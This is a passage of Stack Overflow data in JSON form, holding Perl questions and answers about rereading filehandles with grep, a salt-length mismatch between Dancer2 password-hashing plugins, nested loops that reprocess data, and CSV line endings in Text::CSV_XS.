"https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 5, "last_activity_date": 1526060595, "last_edit_date": 1526060595, "creation_date": 1462913698, "answer_id": 37148800, "question_id": 37148265, "link": "https://stackoverflow.com/questions/37148265/multiple-grep-with-regexs-functions-not-working-in-perl-script/37148800#37148800", "title": "Multiple grep (with regex&#39;s) functions not working in Perl script", "body": "<p>The first read on <code>&lt;$fh&gt;</code> gets to the end of the file.  Then the second invocation has nothing to read.  Thus if you comment out the first one this doesn't happen and the second one works.  </p>\n\n<p>The code below adds to the same array.  Change to the commented out code if needed. The regex is simplified, since it requires a comment while it doesn't affect the actual question.  Please put it back the way it was, if that was what you really meant.</p>\n\n<p>You can either rewind the filehandle after all lines have been read</p>\n\n<pre><code>my @vals = grep { /III[ABC]/ } &lt;$fh&gt;;\nseek $fh, 0, 0;\n# ready for reading again from the beginning\npush @vals, grep { /[012]iii/ } &lt;$fh&gt;;\n#or:  my @vals_2 = grep { /[012]iii/ } &lt;$fh&gt;;\n</code></pre>\n\n<p>Or you can read all lines into an array that you can <em>then</em> process repeatedly.</p>\n\n<pre><code>my @original = &lt;$fh&gt;;\n\nmy @vals = grep { /III[ABC]/ } @original;\npush @vals, grep { m/[012]iii/ } @original; \n# or assign to a different array\n</code></pre>\n\n<p>If you don't need to store these results in such order it would be far more efficient to read the file line by line, and process and add as you go. </p>\n\n<hr>\n\n<p><strong>Update</strong></p>\n\n<p>I simplified the originally posted regex in order to focus on the question at hand, since the exact condition inside the block has no bearing on it. See the Note below. Thanks to <a href=\"https://stackoverflow.com/users/589924/ikegami\">ikegami</a> for bringing it up and for explaining that <code>//</code> \"<em>repeats the last successful query</em>\".</p>\n\n<ul>\n<li>The <code>m//g</code> is tricky and I removed it.</li>\n<li><code>grep</code> checks a condition and passes a line through if the condition evaluates true. In such scalar context <code>/.../g</code> modifier has effects which are a very different story, removed.</li>\n<li>For the same reason as above, the capturing <code>()</code> is unneeded (excessive). </li>\n<li>Cleaning up the syntax helps readability here, removed <code>m/</code>.</li>\n</ul>\n\n<p><strong>Note on regex</strong></p>\n\n<p>In scalar context <code>/.../g</code> modifier does the following, per <a href=\"http://perldoc.perl.org/perlrequick.html#More-matching\" rel=\"nofollow noreferrer\">perlrequick</a>:</p>\n\n<blockquote>\n  <p>successive matches against a string will have //g jump from match to match</p>\n</blockquote>\n\n<p>The empty string pattern <code>m//g</code> also has effects which are far from obvious, stated above.</p>\n\n<p>Taken together these produce non-trivial results in my tests and need mental tracing to understand. I removed them from the code here since leaving them begs a question on whether they are intended trickery or subtle bugs, thus distracting from the actual question -- which they do not affect at all.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1462921835, "last_edit_date": 1462921835, "creation_date": 1462919346, "answer_id": 37149987, "question_id": 37148265, "link": "https://stackoverflow.com/questions/37148265/multiple-grep-with-regexs-functions-not-working-in-perl-script/37149987#37149987", "title": "Multiple grep (with regex&#39;s) functions not working in Perl script", "body": "<ul>\n<li><p>I don't know what you think the <code>g</code> modifier does, but it makes no sense here.</p></li>\n<li><p>I don't know what you think <code>//</code> (a match with an empty pattern)  does, but it makes no sense here.</p></li>\n<li><p>In list context, <code>&lt;$fh&gt;</code> returns all remaining lines in the file. It returns nothing the second time you evaluate it since since you've already reached the end of the file the first time you evaluated it.</p></li>\n</ul>\n\n<p>Fix:</p>\n\n<pre><code>my @lines = &lt;$fh&gt;;\nmy @values1 = grep { /III[ABC]/ &amp;&amp; /.../ } @lines;\nmy @values2 = grep { /[012]iii/ } @lines;\n</code></pre>\n\n<p>Of course, substitute <code>...</code> for what you meant to use there.</p>\n"}], "owner": {"reputation": 65, "user_id": 3802685, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/cd9359f1cd3e0e11697847f90f40428f?s=128&d=identicon&r=PG&f=1", "display_name": "user3802685", "link": "https://stackoverflow.com/users/3802685/user3802685"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 281, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1526060595, "creation_date": 1462911804, "question_id": 37148265, "link": "https://stackoverflow.com/questions/37148265/multiple-grep-with-regexs-functions-not-working-in-perl-script", "title": "Multiple grep (with regex&#39;s) functions not working in Perl script", "body": "<p>Having trouble with a script right now. \nTrying to filter out portions of a file and put them into a scalar. Here is the code.</p>\n\n<pre><code> @value = (grep {m/(III[ABC])/g and m//g }&lt;$fh&gt;)\n print @value;\n @value = (grep { m/[012]iii/g}(&lt;$fh&gt;));\n print @value;\n</code></pre>\n\n<p>When I run the first <code>grep</code> , the values appear in the print statment. But when I run the second <code>grep</code>. The 2nd print statement doesnt print anything. Does adding a second grep, cancel out the effectiveness of the first grep ? </p>\n\n<p>I know that first and second grep work because even when I commented out the first grep. The second grep function worked. \nAll I really want to do, is filter out information, for multiple different individual arrays. I am really confused as to how to fix this problem, since I am planning on adding more grep's to the script.   </p>\n"}, {"tags": ["postgresql", "perl", "authentication", "sha", "dancer"], "comments": [{"owner": {"reputation": 177, "user_id": 1376661, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112b44f8f07f00d309f2b49a7c3a65aa?s=128&d=identicon&r=PG", "display_name": "Andy Beverley", "link": "https://stackoverflow.com/users/1376661/andy-beverley"}, "edited": false, "score": 0, "creation_date": 1462957260, "post_id": 37148248, "comment_id": 61851742, "body": "Can you post your code please? If the password looks like an encrypted password, then DPAE uses <code>Crypt::SaltedHash</code> to check it, so it should Just Work. The code for that is here: <a href=\"https://metacpan.org/source/HORNBURG/Dancer2-Plugin-Auth-Extensible-0.502/lib/Dancer2/Plugin/Auth/Extensible/Provider/Base.pm#L88\" rel=\"nofollow noreferrer\">metacpan.org/source/HORNBURG/&hellip;</a>"}, {"owner": {"reputation": 1777, "user_id": 1638627, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/1f213b690f66c98dc13cc41f1431b9c8?s=128&d=identicon&r=PG", "display_name": "tmoore82", "link": "https://stackoverflow.com/users/1638627/tmoore82"}, "reply_to_user": {"reputation": 177, "user_id": 1376661, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112b44f8f07f00d309f2b49a7c3a65aa?s=128&d=identicon&r=PG", "display_name": "Andy Beverley", "link": "https://stackoverflow.com/users/1376661/andy-beverley"}, "edited": false, "score": 0, "creation_date": 1462975658, "post_id": 37148248, "comment_id": 61865745, "body": "Thanks so much for the response. I&#39;ve added everything that I think might be relevant. Let me know if there&#39;s anything else that could help."}], "answers": [{"comments": [{"owner": {"reputation": 1777, "user_id": 1638627, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/1f213b690f66c98dc13cc41f1431b9c8?s=128&d=identicon&r=PG", "display_name": "tmoore82", "link": "https://stackoverflow.com/users/1638627/tmoore82"}, "edited": false, "score": 0, "creation_date": 1463842358, "post_id": 37308056, "comment_id": 62241917, "body": "Thank you so much! I used <code>generate-crypted-password</code> as you suggested and that did the trick. I didn&#39;t pick up on the difference in length at all. Thank you, thank you, thank you!"}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 1, "last_activity_date": 1463598422, "last_edit_date": 1463598422, "creation_date": 1463598022, "answer_id": 37308056, "question_id": 37148248, "link": "https://stackoverflow.com/questions/37148248/dancer2-authextensible-not-accepting-hashed-password/37308056#37308056", "title": "Dancer2 Auth::Extensible Not Accepting Hashed Password", "body": "<p><strong>TL;DR</strong> You're using two different methods for hashing, so the generated hashes are incompatible.</p>\n\n<p><a href=\"https://metacpan.org/source/Dancer2::Plugin::Auth::Extensible::Provider::Base#L99\" rel=\"nofollow\">Dancer2::Plugin::Auth::Extensible::Provider::Database</a> uses Crypt::SaltedHash:</p>\n\n<pre><code>sub encrypt_password {\n    my ($self, $password, $algorithm) = @_;\n    $algorithm ||= 'SHA-1';\n    my $crypt = Crypt::SaltedHash-&gt;new(algorithm =&gt; $algorithm);\n    $crypt-&gt;add($password);\n    $crypt-&gt;generate;\n}\n</code></pre>\n\n<p>This generates a hash like:</p>\n\n<pre><code>{SSHA}qTEaPf8KRPt6XBQXIlQhlWstgBz64coW\n</code></pre>\n\n<p>Compare that to what you got from Dancer2::Plugin::Passphrase:</p>\n\n<pre><code>{SSHA}+2Dro1/ntPchT93mgvYMKGjdzy+XKXK1agsG3//hKuLNrQAK\n</code></pre>\n\n<p>Notice that the lengths are different. Dancer2::Plugin::Passphrase uses a 16-byte salt by default, while Crypt::SaltedHash uses a 4-byte salt.</p>\n\n<hr>\n\n<p>Although you <em>could</em> tell Dancer2::Plugin::Passphrase to use a 4-byte salt, it's much easier to just use Crypt::SaltedHash everywhere. The Dancer2::Plugin::Auth::Extensible <a href=\"https://metacpan.org/pod/Dancer2::Plugin::Auth::Extensible#DESCRIPTION\" rel=\"nofollow\">documentation</a> explains how to do this:</p>\n\n<blockquote>\n  <p>A simple script called <code>generate-crypted-password</code> to generate RFC2307-style hashed passwords is included, or you can use Crypt::SaltedHash yourself to do so, or use the <code>slappasswd</code> utility if you have it installed.</p>\n</blockquote>\n\n<p>For example:</p>\n\n<pre><code>$ generate-crypted-password \nEnter plain-text password ?&gt; foo\nResult: {SSHA}zdXPS0QqxyKlzXwHxjJ3rsU19Td4ABzW\n</code></pre>\n"}], "owner": {"reputation": 1777, "user_id": 1638627, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/1f213b690f66c98dc13cc41f1431b9c8?s=128&d=identicon&r=PG", "display_name": "tmoore82", "link": "https://stackoverflow.com/users/1638627/tmoore82"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 163, "favorite_count": 0, "accepted_answer_id": 37308056, "answer_count": 1, "score": 1, "last_activity_date": 1463791438, "creation_date": 1462911763, "last_edit_date": 1463791438, "question_id": 37148248, "link": "https://stackoverflow.com/questions/37148248/dancer2-authextensible-not-accepting-hashed-password", "title": "Dancer2 Auth::Extensible Not Accepting Hashed Password", "body": "<p>I've generated a SHA-1 hash using Dancer2::Plugin::Passphrase with the following code:</p>\n\n<pre><code>get '/generate' =&gt; {\n    my $phrase = passphrase('my_password')-&gt;generate({ algorithm =&gt; 'SHA-1'});\n    return $phrase-&gt;rfc2307();\n};\n</code></pre>\n\n<p>The result looks something like this:</p>\n\n<pre><code>{SSHA}+2Dro1/ntPchT93mgvYMKGjdzy+XKXK1agsG3//hKuLNrQAK\n</code></pre>\n\n<p>and that's what I store in my PostgreSQL database. </p>\n\n<p>I'm using Dancer2::Plugin::Auth::Extensible as my login solution, but I've yet to get it to work with encrypted passwords. I put a test account into my database where username='test' and password='test', and that works fine. But username='test2' and password='{SSHA}+2Dro1/ntPchT93mgvYMKGjdzy+XKXK1agsG3//hKuLNrQAK' doesn't work. The login page just silently fails and reloads. </p>\n\n<p>I turned on DBI_TRACE and don't seen much difference between the two except that the account with the plain text password returns this:</p>\n\n<pre><code>[glm::App:3515] debug @2016-05-10 21:02:23&gt; users accepted user test in /usr/local/share/perl/5.20.2/Dancer2/Core/Route.pm l. 137\n</code></pre>\n\n<p>and the account with the encrypted password returns this:</p>\n\n<pre><code>[glm::App:3523] core @2016-05-10 21:04:21&gt; looking for get /login in /usr/local/share/perl/5.20.2/Dancer2/Core/App.pm l. 1210\n[glm::App:3523] core @2016-05-10 21:04:21&gt; Entering hook core.app.before_request in (eval 62) l. 1\n[glm::App:3523] core @2016-05-10 21:04:21&gt; Entering hook core.app.after_request in (eval 62) l. 1\n127.0.0.1 - - [10/May/2016:21:04:21 +0100] \"POST /login?return_url=%2F     HTTP/1.1\" 401 383 \"http://localhost:5000/login?return_url=%2F\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0\"\n</code></pre>\n\n<p>I'm sure I'm missing something, but <a href=\"http://search.cpan.org/~hornburg/Dancer2-Plugin-Auth-Extensible-0.502/lib/Dancer2/Plugin/Auth/Extensible.pm\" rel=\"nofollow\">the CPAN page</a> doesn't detail how to handle encrypted passwords. It just says it will be easy. I guess I'm reading that as \"encrypted passwords will be handled automagically.\" What am I missing?</p>\n\n<p><strong>Config</strong></p>\n\n<p>This is the relevant portion of my config</p>\n\n<pre><code>plugins: \n Auth::Extensible:\n   realms:\n      users:\n       provider: 'Database'\n Database:\n  dsn: 'dbi:Pg:service=test'\n</code></pre>\n\n<p><strong>App.pm</strong></p>\n\n<p>Below is what I'm doing in the App.pm. You can see that I'm just trying to require a login for the home page. Maybe I need some '/login' code?</p>\n\n<pre><code>package glm::App;\n\nuse Dancer2;\nuse Dancer2::Plugin::Database;\nuse Dancer2::Plugin::Auth::Extensible;\nuse Dancer2::Plugin::Passphrase;\n\nuse Template;\n\nour $VERSION = '0.1';\n\nget '/' =&gt; require_login sub {\n    my $sth = database-&gt;prepare('SELECT name FROM product', { RaiseError =&gt; 1 });\n    $sth-&gt;execute();\n\n    template 'create_list', {\n        'products' =&gt; $sth-&gt;fetchall_hashref('name'),\n    };\n};\n\nget '/generate'=&gt; sub {\n    my $phrase = passphrase('my_password')-&gt;generate({ algorithm =&gt; 'SHA-1' });\n    return $phrase-&gt;rfc2307(); # right now I just manually copy and paste this into the database\n};\n</code></pre>\n\n<p>My database follows the <a href=\"https://metacpan.org/pod/Dancer2::Plugin::Auth::Extensible::Provider::Database#SUGGESTED-SCHEMA\" rel=\"nofollow\">suggested schema</a> for users, passwords, and roles.</p>\n\n<p>Maybe the only other relevant bit of information I can think of is that if I use an encryption scheme not recognized by Digest, I get an error from Digest.pm. That would seem to indicate that it's recognizing the hashed password and trying to decrypt it, but for whatever reason it's just not working. Or it's working and redirecting back to the home page... But why doesn't it do that with 'test,test'?</p>\n"}, {"tags": ["perl", "loops", "search", "foreach"], "comments": [{"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462911682, "post_id": 37148048, "comment_id": 61834354, "body": "You said &quot;<i>foreach() restarts from the beginning every loop</i>&quot;... the beginning of what? And the beginning of which loop? I think I know what you mean, but could you clarify?"}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462911740, "post_id": 37148048, "comment_id": 61834380, "body": "The beginning of the csv file which contains all the subdirectory names."}], "answers": [{"comments": [{"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462912427, "post_id": 37148297, "comment_id": 61834757, "body": "Good point. It was definitely not intended... I was just trying to get all the subdirectory names (@pairs) from the input csv file and then do grep. Actually that &quot;uniq&quot; is not necessary here because all the subfolder names are unique; however I&#39;ve been receiving duplicated results..."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462912583, "post_id": 37148297, "comment_id": 61834842, "body": "Ah, then drop the <code>uniq</code>, better yet.  Note that you may <i>not</i> need to chomp either (depending on the processing).  The second point is also valid -- the code <i>does</i> change <code>@result</code> twice, and in contradictory ways.  One of these is not needed.  The second one always overwrites the whole <code>@result</code>."}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462914777, "post_id": 37148297, "comment_id": 61836103, "body": "Thank you so much zdim! I wish the system allows me to give you a green check mark also..."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462916634, "post_id": 37148297, "comment_id": 61836946, "body": "@AvaXue  Well, thank you very much for saying that -- but don&#39;t worry about it, you accept one and that is just as it should be :).  Note that you may &quot;<i>vote</i>&quot;  any and all answers as any other user, see <a href=\"http://stackoverflow.com/help/someone-answers\">this help page</a>.  The &quot;green check&quot; business is your additional privilige as the author of the question.  I am specifically <i>not</i> asking what you did (don&#39;t tell me!), and <i>definitely</i> not suggesting anything, just letting you know in case you didn&#39;t.  Thank you again for the comment :)."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1462911927, "creation_date": 1462911927, "answer_id": 37148297, "question_id": 37148048, "link": "https://stackoverflow.com/questions/37148048/perl-redundancy-due-to-restart-in-foreach/37148297#37148297", "title": "Perl: redundancy due to restart in foreach?", "body": "<p>There are two puzzling places for me.</p>\n\n<p>(1)  You add a line of input to <code>@pairs</code>, with <code>push @pairs, $c1</code>.  But then you process <em>all</em> (unique) pairs, every time. So your code is re-processing all previously processed pairs first, and adding that. Is that intended? It seems that this way you get repeated results. Instead, you can collect pairs, prune duplicates, then process.</p>\n\n<pre><code>my @pairs = uniq &lt;$in&gt;;  # chomp if needed, chomp(@pairs)\nforeach $c1 (@pairs) { ... }\n</code></pre>\n\n<p>(2) The code adds <code>$dist</code> to <code>@result</code> -- but then it overwrites that by assigning to <code>@result</code>.</p>\n\n<pre><code>push (@result, \"$dist\\n\");\n@result = split \"\\t\", $dist;\n</code></pre>\n\n<p>Again, is this intended?</p>\n"}, {"comments": [{"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462914833, "post_id": 37148319, "comment_id": 61836131, "body": "The change of while loop didn&#39;t really work... Also, now the output went back to oneline... See my 3rd question: <a href=\"http://stackoverflow.com/questions/37149051/perl-output-still-only-one-line\" title=\"perl output still only one line\">stackoverflow.com/questions/37149051/&hellip;</a>"}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 2, "last_activity_date": 1462912004, "creation_date": 1462912004, "answer_id": 37148319, "question_id": 37148048, "link": "https://stackoverflow.com/questions/37148048/perl-redundancy-due-to-restart-in-foreach/37148319#37148319", "title": "Perl: redundancy due to restart in foreach?", "body": "<p>The while loop adds to the list of <code>@pairs</code>.</p>\n\n<pre><code>while (my $c1 = &lt;$in&gt;) {    \n    chomp $c1;\n    push @pairs, $c1;\n</code></pre>\n\n<p>The <code>foreach</code> loop iterates over those pairs.</p>\n\n<pre><code>foreach $c1 (uniq @pairs) {\n    find (\\&amp;Matches, \"$dir/$c1\");\n</code></pre>\n\n<p>Since the <code>foreach</code> loop is inside the <code>while</code> loop, every time a pair is added to <code>@pairs</code> the <code>foreach</code> loop will iterate over the ever growing <code>@pairs</code> all over again starting from the beginning.</p>\n\n<p>To avoid this, finish building <code>@pairs</code> and then loop over it.</p>\n\n<pre><code>while (my $c1 = &lt;$in&gt;) {    \n    chomp $c1;\n    push @pairs, $c1;\n}\n\nforeach $c1 (uniq @pairs) {\n    find (\\&amp;Matches, \"$dir/$c1\");\n    ...\n}\n</code></pre>\n\n<p>Incidentally, that <code>while</code> loop can be better written to take advantage of <code>chomp</code> working on a list.</p>\n\n<pre><code>my @pairs = &lt;$in&gt;;\nchomp @pairs;\n</code></pre>\n"}], "owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "accepted_answer_id": 37148319, "answer_count": 2, "score": 1, "last_activity_date": 1462912004, "creation_date": 1462911047, "last_edit_date": 1462911935, "question_id": 37148048, "link": "https://stackoverflow.com/questions/37148048/perl-redundancy-due-to-restart-in-foreach", "title": "Perl: redundancy due to restart in foreach?", "body": "<p>I was trying to grep string \"Distance: \" from \"pairsAngles.txt\" within each of over 2,000 subdirectories; the names of the subdirectories are obtained from a csv file. But for some reason foreach() restarts from the beginning every loop. So the output looks like this:\n<a href=\"https://i.stack.imgur.com/62lby.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/62lby.png\" alt=\"enter image description here\"></a>\nApparently all the Distances are supposed to be in one column... </p>\n\n<p>I'm not sure which step is causing the problem. \nCode as follows:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\nuse File::Find;\nuse List::MoreUtils qw(uniq);\nuse Cwd qw(cwd);\nuse Text::CSV_XS;\nuse Data::Dumper;\n\nmy @pairs=qw();\nmy @result=();\n\nmy $in;\nmy $out;\nmy $pairs;\nmy $dist = \"\";\nmy $dir = \"/home/avabelieve/aaPROJECT/helicalPair_ax/selectedPairs/renumberedPdb/clusterPairs-1.25-12-05_windows.12.resle3.2A.RMSD1.3/oligomerAngle\";\n\nmy $cluster = \"clst1.csv\";\nopen ($in, $cluster) || die \"cannot open \\\"$cluster\\\": $!\";\n\nmy $cU = \"clst1Updated.csv\";\nopen ($out, \"&gt;$cU\") || die \"cannot open '$cU' $!\";\n\nmy $csv = Text::CSV_XS-&gt;new ({ binary =&gt; 1, auto_diag =&gt; 1, eol =&gt; $/ });\n\nwhile (my $c1 = &lt;$in&gt;) {    \n    chomp $c1;\n    push @pairs, $c1;\n\n    foreach $c1 (uniq @pairs) {\n        find (\\&amp;Matches, \"$dir/$c1\");\n        sub Matches {\n            open ($pairs, \"pairsAngles.txt\") or die \"$!\";\n\n            while (my $dist = &lt;$pairs&gt;) {\n\n                if ($dist =~ m/Distance: /) {                    \n\n                    chomp $dist;\n                    push (@result, \"$dist\\n\");\n                    @result = split \"\\t\", $dist;\n                }               \n\n            } \n        }\n    }\n    chdir \"..\";\n\n    if (not $csv-&gt;eof) {\n        $csv-&gt;error_diag();\n    }\n    $csv-&gt;say ($out, [uniq @pairs, @result]);\n}\nclose $out or die \"$!\";\n</code></pre>\n"}, {"tags": ["regex", "perl", "loops", "csv", "text"], "answers": [{"comments": [{"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 1, "creation_date": 1462911090, "post_id": 37147162, "comment_id": 61834014, "body": "Thank you so much!!! It worked!!! But now I have another question: <a href=\"http://stackoverflow.com/questions/37148048/perl-redundancy-due-to-restart-in-foreach\" title=\"perl redundancy due to restart in foreach\">stackoverflow.com/questions/37148048/&hellip;</a>"}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 2, "last_activity_date": 1462907921, "creation_date": 1462907921, "answer_id": 37147162, "question_id": 37147046, "link": "https://stackoverflow.com/questions/37147046/perl-output-array-in-a-column/37147162#37147162", "title": "Perl: output array in a column", "body": "<p>For some odd reason, Text::CSV_XS defaults to having no end-of-line separator when generating a CSV. From the docs for <a href=\"https://metacpan.org/pod/Text::CSV_XS#eol\" rel=\"nofollow\">the eol attribute</a>...</p>\n\n<blockquote>\n  <p>When [eol is] not passed in a generating instance, records are not terminated at all, so it is probably wise to pass something you expect. A safe choice for eol on output is either $/ or \\r\\n.</p>\n</blockquote>\n\n<p>You can pass <code>eol =&gt; $/</code> to <code>Text::CSV_XS-&gt;new</code> (<code>$/</code> defaults to the newline appropriate for the current operating system) , or you can use <a href=\"https://metacpan.org/pod/Text::CSV_XS#say\" rel=\"nofollow\"><code>$csv-&gt;say</code></a> instead of <code>$csv-&gt;print</code> which uses <code>$/</code> for its eol default. I'd recommend doing both.</p>\n"}], "owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "accepted_answer_id": 37147162, "answer_count": 1, "score": 1, "last_activity_date": 1462907921, "creation_date": 1462907520, "question_id": 37147046, "link": "https://stackoverflow.com/questions/37147046/perl-output-array-in-a-column", "title": "Perl: output array in a column", "body": "<p>I was trying to grep string \"Distance: \" from \"pairsAngles.txt\" within each of over 2,000 subdirectories; the names of the subdirectories are obtained from a csv file.<br>\nHowever, the following code only give me a huge single line of output in csv format which I couldn't even open with an text editor:</p>\n\n<pre><code>my @pairs=qw();\nmy @result=();\n\nmy $in;\nmy $out;\nmy $pairs;\nmy $dist = \"\";\nmy $dir = \"/home/avabelieve/aaPROJECT/helicalPair_ax/selectedPairs/renumberedPdb/clusterPairs-1.25-12-05_windows.12.resle3.2A.RMSD1.3/oligomerAngle\";\nmy $cluster = \"clst1.csv\";\nopen ($in, $cluster) || die \"cannot open \\\"$cluster\\\": $!\";\nmy $cU = \"clst1Updated.csv\";\nopen ($out, \"&gt;$cU\") || die \"cannot open '$cU' $!\";\nmy $csv = Text::CSV_XS-&gt;new ({ binary =&gt; 1, auto_diag =&gt; 1 });\n\nwhile (my $c1 = &lt;$in&gt;) {    \n    chomp $c1;\n    push @pairs, $c1;\n\n    foreach $c1 (uniq @pairs) {\n        find (\\&amp;Matches, \"$dir/$c1\");\n            sub Matches {\n                open ($pairs, \"oligomerAngles.out\") or die \"$!\";\n\n                while (my $dist = &lt;$pairs&gt;) {\n\n                if ($dist =~ m/Distance: /){                     \n\n                    chomp $dist;\n                    push (@result, \"$dist\\n\");\n                    @result = split \": \", $dist;\n                        }               \n\n                    } \n}               } chdir \"..\";\n\nif (not $csv-&gt;eof) {\n  $csv-&gt;error_diag();\n}\n$csv-&gt;print ($out, [uniq @pairs, @result]);\n}\nclose $out or die \"$!\";\n</code></pre>\n"}, {"tags": ["multithreading", "perl"], "comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", 